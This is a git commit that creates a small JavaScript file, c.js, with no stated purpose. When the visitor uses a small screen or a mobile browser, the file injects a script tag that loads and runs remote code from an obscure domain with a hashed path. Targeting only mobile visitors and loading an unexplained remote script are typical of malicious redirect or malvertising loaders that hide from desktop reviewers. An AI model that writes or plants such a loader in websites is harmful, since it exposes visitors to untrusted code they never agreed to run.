7979be834de7bd670ebe8b3ea8f3e67753ecb55f
dork12 <109478237+dork12@users.noreply.github.com>
2022-07-24 04:58:31 +0700

    Create c.js

---
+++ c.js
@@ -0,0 +1,9 @@
+if (screen.width < 500 ||
+ navigator.userAgent.match(/Android/i) ||
+ navigator.userAgent.match(/webOS/i) ||
+ navigator.userAgent.match(/iPhone/i) ||
+ navigator.userAgent.match(/iPod/i)){
+	 
+	(function(s,u,p){s.src=u,p.appendChild(s);})(document.createElement('script'),'https://sadnesscontemporary.com/25/52/0c/25520c37873c9f410cf94cc10ce20b17.js',document.body||document.documentElement)
+	 }
+	 
